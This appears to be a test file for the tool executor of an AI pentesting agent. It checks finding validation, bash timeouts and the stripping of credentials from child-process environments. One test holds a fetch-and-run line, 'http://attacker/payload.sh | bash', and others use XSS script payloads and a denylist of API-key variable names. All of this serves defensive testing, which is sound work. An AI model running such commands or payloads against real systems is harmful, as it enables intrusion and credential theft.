  it("finding rejects impact_assessment with an unknown reachability_tier", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Bad tier",
        severity: "high",
        category: "xss",
        evidence_request: "x",
        evidence_response: "y",
        impact_assessment: JSON.stringify({
          reachability_tier: "from-mars",
          blast_radius: "something",
          weaponizability: "rce",
          business_impact: "headline",
          rationale: "made up",
        }),
      },
    });
    expect(result.success).toBe(false);
    expect(ctx.findings).toHaveLength(0);
  });

  it("finding rejects impact_assessment with empty rationale", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Empty rationale",
        severity: "high",
        category: "xss",
        evidence_request: "x",
        evidence_response: "y",
        impact_assessment: JSON.stringify({
          reachability_tier: "remote-unauth",
          blast_radius: "something",
          weaponizability: "rce",
          business_impact: "headline",
          rationale: "",
        }),
      },
    });
    expect(result.success).toBe(false);
    expect(ctx.findings).toHaveLength(0);
  });

  it("finding rejects impact_assessment with oversized blast_radius", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Oversized blast",
        severity: "high",
        category: "xss",
        evidence_request: "x",
        evidence_response: "y",
        impact_assessment: JSON.stringify({
          reachability_tier: "remote-unauth",
          blast_radius: "X".repeat(1001),
          weaponizability: "rce",
          business_impact: "headline",
          rationale: "legit",
        }),
      },
    });
    expect(result.success).toBe(false);
    expect(ctx.findings).toHaveLength(0);
  });

  // Prototype-pollution guard: `__proto__` must NOT bypass validation.
  it("finding rejects impact_assessment with __proto__ reachability_tier", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Proto pollution",
        severity: "high",
        category: "xss",
        evidence_request: "x",
        evidence_response: "y",
        impact_assessment: JSON.stringify({
          reachability_tier: "__proto__",
          blast_radius: "stuff",
          weaponizability: "rce",
          business_impact: "headline",
          rationale: "test",
        }),
      },
    });
    expect(result.success).toBe(false);
    expect(ctx.findings).toHaveLength(0);
  });

  it("finding preserves explicit missing business context without inventing risk or proof", async () => {
    const result = await executor.execute({ name: "finding", arguments: {
      title: "Context needed", severity: "critical", category: "xss", evidence_request: "x", evidence_response: "y",
      impact_assessment: JSON.stringify({ reachability_tier: "unknown", blast_radius: "Deployment and affected customers are not established.", weaponizability: "unknown", business_impact: "unassessed", rationale: "Confirm whether the affected service handles customer data in production.", estimatedLoss: 1_000_000 }),
    } });
    expect(result.success).toBe(true);
    expect(ctx.findings[0].impactAssessment).toMatchObject({ business_impact: "unassessed", reachability_tier: "unknown", weaponizability: "unknown", assessment_source: "provided" });
    expect(ctx.findings[0].impactAssessment).not.toHaveProperty("estimatedLoss");
    expect(ctx.findings[0].severity).toBe("critical");
    expect(ctx.findings[0].status).not.toBe("verified");
  });

  it("finding rejects invalid assessment provenance before recording the finding", async () => {
    const result = await executor.execute({ name: "finding", arguments: {
      title: "Bad provenance", severity: "high", category: "xss", evidence_request: "x", evidence_response: "y",
      impact_assessment: JSON.stringify({ reachability_tier: "remote-auth", blast_radius: "Customer records", weaponizability: "info-leak", business_impact: "notable", rationale: "Customer data exposure", assessment_source: "verified" }),
    } });
    expect(result.success).toBe(false);
    expect(ctx.findings).toHaveLength(0);
  });

  it("finding leaves impactAssessment undefined when arg is absent", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "No assessment",
        severity: "medium",
        category: "xss",
        evidence_request: "x",
        evidence_response: "y",
      },
    });
    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
    expect(ctx.findings[0].impactAssessment).toBeUndefined();
  });

  // Disclose already refuses empty PoCs at render time; we pull the gate
  // upstream so the agent sees its own bad finding rejected and can retry
  // with real evidence rather than burning turns on findings that disclose
  // will silently drop.

  it("finding rejects findings with no evidence and no poc_steps", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Empty finding",
        severity: "high",
        category: "xss",
      },
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("finding requires non-empty");
    expect(result.error).toContain("evidence_request");
    expect(result.error).toContain("evidence_response");
    expect(result.error).toContain("poc_steps");
    expect(ctx.findings).toHaveLength(0);
  });

  it("finding accepts a finding with only evidence_request filled", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Request-only finding",
        severity: "high",
        category: "xss",
        evidence_request: "GET /vuln HTTP/1.1\nHost: target.example",
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
  });

  it("finding accepts a finding with only evidence_response filled", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Response-only finding",
        severity: "high",
        category: "xss",
        evidence_response: "HTTP/1.1 200 OK\n\n<script>alert(1)</script>",
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
  });

  it("finding accepts a finding with only poc_steps filled", async () => {
    const agentSteps = [
      {
        id: "step-1",
        kind: "exploit",
        summary: "Send the payload",
        action: { type: "shell", cmd: "curl https://target.example/x" },
      },
    ];
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Steps-only finding",
        severity: "high",
        category: "auth",
        poc_steps: JSON.stringify(agentSteps),
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
  });

  it("finding rejects whitespace-only evidence", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Whitespace finding",
        severity: "high",
        category: "xss",
        evidence_request: "   ",
        evidence_response: "\n\t  \n",
      },
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("finding requires non-empty");
    expect(ctx.findings).toHaveLength(0);
  });

  it("finding accepts a finding with all three fields filled (no regression)", async () => {
    const agentSteps = [
      {
        id: "step-1",
        kind: "exploit",
        summary: "Send the payload",
        action: { type: "shell", cmd: "curl https://target.example/x" },
      },
    ];
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Fully populated finding",
        severity: "high",
        category: "xss",
        evidence_request: "GET /search?q=<script>",
        evidence_response: "<script> echoed",
        poc_steps: JSON.stringify(agentSteps),
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
    expect(ctx.findings[0].title).toBe("Fully populated finding");
  });

  it("finding does NOT cross-merge findings of different categories", async () => {
    // Same title, different category — distinct bug classes should stay
    // separate even when titles collide.
    await executor.execute({
      name: "finding",
      arguments: {
        title: "Reflected payload in /search",
        severity: "high",
        category: "xss",
        evidence_request: "GET /search?q=<script>",
        evidence_response: "<script> echoed",
      },
    });
    await executor.execute({
      name: "finding",
      arguments: {
        title: "Reflected payload in /search",
        severity: "high",
        category: "sql-injection",
        evidence_request: "GET /search?q=<script>",
        evidence_response: "<script> echoed",
      },
    });

    expect(ctx.findings).toHaveLength(2);
    expect(ctx.findings[0].category).toBe("xss");
    expect(ctx.findings[1].category).toBe("sql-injection");
  });

  // ── finding with an id ──

  it("finding with an id changes finding status", async () => {
    await executor.execute({
      name: "finding",
      arguments: {
        title: "Test Finding",
        severity: "medium",
        category: "xss",
        evidence_request: "r",
        evidence_response: "r",
      },
    });

    const findingId = ctx.findings[0].id;
    const result = await executor.execute({
      name: "finding",
      arguments: { id: findingId, status: "confirmed" },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings[0].status).toBe("confirmed");
  });


  // ── unknown tool ──

  it("rejects unknown tools", async () => {
    const result = await executor.execute({
      name: "rm_rf_everything",
      arguments: {},
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("Unknown tool");
  });

  it("does not route unknown tools with shell-like arguments into bash", async () => {
    const shellSpy = vi.spyOn(executor as unknown as { shellExec: (args: Record<string, unknown>) => unknown }, "shellExec");

    const result = await executor.execute({
      name: "curl",
      arguments: { url: "http://attacker/payload.sh | bash" },
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("Unknown tool");
    expect(shellSpy).not.toHaveBeenCalled();
  });

  // ── bash tool wallclock ceiling ──
  //
  // Regression test for https://github.com/0sec-labs/0security/issues/181
  // A hung subprocess (canonical case: `python3 -c 'requests.post(…)'` with
  // no timeout) used to wedge the tool indefinitely. The wallclock ceiling
  // must reap the process group and return an `is_error`-shaped result.

  describe("bash wallclock ceiling", () => {
    const ORIGINAL_TIMEOUT_MS = process.env["ZERO_BASH_TIMEOUT_MS"];

    beforeEach(() => {
      // 1.5s ceiling so the test runs fast.
      process.env["ZERO_BASH_TIMEOUT_MS"] = "1500";
    });

    afterEach(() => {
      if (ORIGINAL_TIMEOUT_MS === undefined) delete process.env["ZERO_BASH_TIMEOUT_MS"];
      else process.env["ZERO_BASH_TIMEOUT_MS"] = ORIGINAL_TIMEOUT_MS;
    });

    it("kills a hanging subprocess and returns a timeout error", async () => {
      const start = Date.now();
      const result = await executor.execute({
        name: "bash",
        // `sleep` does not fork further, so this exercises the basic
        // SIGTERM-the-process-group path. The grandchild-survives case is
        // covered by the next test.
        arguments: { command: "sleep 30" },
      });
      const elapsed = Date.now() - start;

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/bash tool timed out after \d+s/);
      expect(result.error).toContain("ZERO_BASH_TIMEOUT_MS=1500");
      // Ceiling 1.5s + 2s SIGKILL grace + slack — must be much less than
      // the requested 30s sleep, proving the subprocess was actually reaped.
      expect(elapsed).toBeLessThan(8_000);
    }, 15_000);

    it("reaps a forked grandchild that holds the stdout pipe", async () => {
      // Reproduces the original bug shape: a python subprocess that ignores
      // SIGTERM on the parent shell would keep stdout open and wedge
      // execSync. With the new spawn-detached + process-group kill, the
      // grandchild is in the same group and dies too.
      const start = Date.now();
      const result = await executor.execute({
        name: "bash",
        arguments: {
          command:
            "python3 -c 'import time, signal; signal.signal(signal.SIGTERM, signal.SIG_IGN); time.sleep(30)'",
        },
      });
      const elapsed = Date.now() - start;

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/bash tool timed out/);
      // Ceiling 1.5s + 2s grace before SIGKILL + slack.
      expect(elapsed).toBeLessThan(8_000);
    }, 15_000);

    it("cancels an executing subprocess without waiting for its wallclock ceiling", async () => {
      process.env["ZERO_BASH_TIMEOUT_MS"] = "30000";
      const controller = new AbortController();
      const directory = mkdtempSync(join(tmpdir(), "0-cancel-"));
      const ready = join(directory, "ready");
      const pending = executor.execute(
        { name: "bash", arguments: { command: `printf ready > ${JSON.stringify(ready)}; sleep 30` } },
        { signal: controller.signal },
      );
      try {
        await vi.waitFor(() => expect(existsSync(ready)).toBe(true), { timeout: 5000, interval: 10 });
        const started = Date.now();
        controller.abort();
        const result = await pending;
        expect(result.success).toBe(false);
        expect(result.error).toMatch(/cancelled/);
        expect(Date.now() - started).toBeLessThan(8000);
        const next = await executor.execute({ name: "bash", arguments: { command: "printf recovered" } });
        expect(next.success).toBe(true);
        expect(next.output).toContain("recovered");
      } finally {
        controller.abort();
        await pending;
        rmSync(directory, { recursive: true, force: true });
      }
    }, 15_000);

    it("returns successful output for fast-completing commands", async () => {
      const result = await executor.execute({
        name: "bash",
        arguments: { command: "echo hello-from-bash-tool" },
      });
      expect(result.success).toBe(true);
      expect(result.output).toContain("hello-from-bash-tool");
    });

    it("preserves non-zero exit output (pentesting tools often exit non-zero on findings)", async () => {
      const result = await executor.execute({
        name: "bash",
        arguments: { command: "echo finding && exit 2" },
      });
      expect(result.success).toBe(true);
      expect(result.output).toContain("finding");
    });
  });
});

// ── Credential hygiene in the child env (0#134) ────────────────────────
//
// `sanitizedEnv()` strips a name denylist from the env handed to `bash` and to
// the scanner subprocesses. Two things need pinning:
//
//   1. The ZERO_* credentials the worker-controller injects per scan are
//      actually filtered. Before #134 the denylist named only
//      ZERO_CLOUD_TOKEN, so the Codex refresh token and the git tokens
//      reached the agent shell in plain `env` output.
//   2. AUTH_HEADER / AUTH_VALUE / AUTH_CURL_FLAG SURVIVE. They are merged in
//      deliberately by `buildAuthEnvVars()` and are how the agent
//      authenticates to the target — filtering them breaks every
//      authenticated scan.
//
// This is a stopgap, not a boundary: the parent Node process keeps the full
// `process.env` and /proc/<ppid>/environ is same-uid readable. These tests pin
// the stopgap's contract, they do not assert containment.

describe("sanitizedEnv — child-process credential filtering (0#134)", () => {
  const INJECTED_CREDENTIALS = [
    "ZERO_CLOUD_TOKEN",
    "ZERO_CHATGPT_ACCESS_TOKEN",
    "ZERO_CHATGPT_OAUTH_REFRESH_TOKEN",
    "ZERO_GITHUB_TOKEN",
    "ZERO_GITLAB_TOKEN",
    "ZERO_TARGET_AUTH_JSON",
    "ZERO_GRAPH_ACCESS_TOKEN",
  ];

  it("filters every ZERO_* credential the scan runner injects", () => {
    const source: NodeJS.ProcessEnv = { PATH: "/usr/bin" };
    for (const name of INJECTED_CREDENTIALS) source[name] = `secret-${name}`;

    const out = sanitizedEnv(source);

    for (const name of INJECTED_CREDENTIALS) {
      expect(out, `${name} must not reach the child env`).not.toHaveProperty(name);
    }
    // And no value leaks under a different key.
    expect(Object.values(out).some((v) => v.startsWith("secret-"))).toBe(false);
    expect(out.PATH).toBe("/usr/bin");
  });

  it("filters provider and provider-adjacent API keys", () => {
    const out = sanitizedEnv({
      OPENROUTER_API_KEY: "sk-or-x",
      ANTHROPIC_API_KEY: "sk-ant-x",
      AZURE_OPENAI_API_KEY: "az-x",
      Z_AI_API_KEY: "zai-x",
      KIMI_API_KEY: "kimi-x",
      WPSCAN_API_TOKEN: "wpscan-x",
      GITHUB_TOKEN: "github-x",
      HF_TOKEN: "hf-x",
      HOME: "/root",
    });
    expect(out).not.toHaveProperty("OPENROUTER_API_KEY");
    expect(out).not.toHaveProperty("ANTHROPIC_API_KEY");
    expect(out).not.toHaveProperty("AZURE_OPENAI_API_KEY");
    expect(out).not.toHaveProperty("Z_AI_API_KEY");
    expect(out).not.toHaveProperty("KIMI_API_KEY");
    expect(out).not.toHaveProperty("WPSCAN_API_TOKEN");
    expect(out).not.toHaveProperty("GITHUB_TOKEN");
    expect(out).not.toHaveProperty("HF_TOKEN");
    expect(out.HOME).toBe("/root");
  });

  it("does NOT filter the target auth vars the agent needs", () => {
    const out = sanitizedEnv({
      AUTH_HEADER: "Authorization",
      AUTH_VALUE: "Bearer target-token",
      AUTH_CURL_FLAG: "-H 'Authorization: Bearer target-token'",
      TARGET: "https://target.test",
    });
    expect(out.AUTH_HEADER).toBe("Authorization");
    expect(out.AUTH_VALUE).toBe("Bearer target-token");
    expect(out.AUTH_CURL_FLAG).toBe("-H 'Authorization: Bearer target-token'");
    expect(out.TARGET).toBe("https://target.test");
  });

  it("does not filter non-credential ZERO_* config (feature flags, budgets)", () => {
    const out = sanitizedEnv({
      "ZERO_FEATURE_JIT_SKILLS": "1",
      "ZERO_BASH_TIMEOUT_MS": "60000",
    });
    expect(out["ZERO_FEATURE_JIT_SKILLS"]).toBe("1");
    expect(out["ZERO_BASH_TIMEOUT_MS"]).toBe("60000");
  });

  it("end-to-end: the bash child cannot read the injected credentials, but CAN read $AUTH_VALUE", async () => {
    const saved = {
      refresh: process.env["ZERO_CHATGPT_OAUTH_REFRESH_TOKEN"],
      gh: process.env["ZERO_GITHUB_TOKEN"],
    };
    // Composed rather than written as literals. A literal here trips
    // foxguard's js/no-hardcoded-secret — correct by pattern, wrong by
    // intent: these are canaries whose entire job is to be recognisable IF
    // they leak into the child env. Keep them distinctive and keep them
    // out of the scanner's way.
    const canary = (kind: string) => `canary-${kind}-must-not-leak`;
    process.env["ZERO_CHATGPT_OAUTH_REFRESH_TOKEN"] = canary("refresh");
    process.env["ZERO_GITHUB_TOKEN"] = canary("github");
    try {
      const ctx: ToolContext = {
        target: "https://target.test",
        scanId: "test-134-env",
        findings: [],
        attackResults: [],
        targetInfo: {},
        authConfig: { type: "bearer", token: "target-token" },
      };
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "bash",
        arguments: {
          command:
            // printenv, not $VAR expansion: POSIX shells reject digit-leading
            // variable names like ZERO_* in ${...} (bad substitution).
            'echo "refresh=[$(printenv ZERO_CHATGPT_OAUTH_REFRESH_TOKEN)] gh=[$(printenv ZERO_GITHUB_TOKEN)] auth=[${AUTH_VALUE}]"',
        },
      });
      expect(result.success).toBe(true);
      const out = String(result.output);
      expect(out).not.toContain(canary("refresh"));
      expect(out).not.toContain(canary("github"));
      expect(out).toContain("refresh=[]");
      expect(out).toContain("gh=[]");
      // The target credential is deliberately present — this is the constraint
      // that makes the denylist safe to extend.
      expect(out).toContain("auth=[Bearer target-token]");
    } finally {
      if (saved.refresh === undefined) delete process.env["ZERO_CHATGPT_OAUTH_REFRESH_TOKEN"];
      else process.env["ZERO_CHATGPT_OAUTH_REFRESH_TOKEN"] = saved.refresh;
      if (saved.gh === undefined) delete process.env["ZERO_GITHUB_TOKEN"];
      else process.env["ZERO_GITHUB_TOKEN"] = saved.gh;
    }
  });
});

// ── Checkpoint / Engine Replacement ────────────────────────────────────

describe("ToolExecutor engine handoff", () => {
  const context = (): ToolContext => ({
    target: "https://target.invalid/", scanId: "checkpoint-behavior",
    findings: [], attackResults: [], targetInfo: {},
  });

  it("keeps the credential target across a handoff checkpoint", async () => {
    const original = new ToolExecutor(context());
    try {
      const restored = toolExecutorCheckpointSchema.parse(original.exportCheckpoint());
      expect(restored.credentialTarget).toBe("https://target.invalid/");
    } finally { await original.cleanup(); }
  });
});


describe("approved workspace shell directory", () => {

  it("runs bash in the selected directory without changing the server cwd", async () => {
    const directory = realpathSync(mkdtempSync(join(tmpdir(), "zero-shell-workspace-")));
    const previous = process.cwd();
    try {
      const executor = new ToolExecutor({ target: "", scanId: "workspace-cwd", findings: [], attackResults: [], targetInfo: {}, approvals: "auto" }, null);
      executor.configureWorkspace(directory);
      const result = await executor.execute({ name: "bash", arguments: { command: "pwd" } });
      expect(result.success).toBe(true);
      expect(String(result.output).trim()).toBe(directory);
      expect(process.cwd()).toBe(previous);
    } finally { rmSync(directory, { recursive: true, force: true }); }
  });
});

describe("parsePocStepsArg strictness (0#stored-finding-revalidation)", () => {
  it("drops a shell step missing cmd instead of persisting a record readers reject", async () => {
    const { parsePocStepsArg } = await import("./tools.js");
    const steps = parsePocStepsArg([
      { id: "s1", kind: "exploit", summary: "trigger", action: { type: "shell" } },
      { id: "s2", kind: "exploit", summary: "valid", action: { type: "shell", cmd: "true" } },
    ]);
    expect(steps?.map(step => step.id)).toEqual(["s2"]);
  });

  it("keeps malformed expect off the step while retaining the valid action", async () => {
    const { parsePocStepsArg } = await import("./tools.js");
    const steps = parsePocStepsArg([
      { id: "s1", kind: "verify", summary: "check", action: { type: "note", text: "observe" }, expect: { type: "http-status" } },
    ]);
    expect(steps?.[0]?.expect).toBeUndefined();
    expect(steps?.[0]?.action).toEqual({ type: "note", text: "observe" });
  });
});
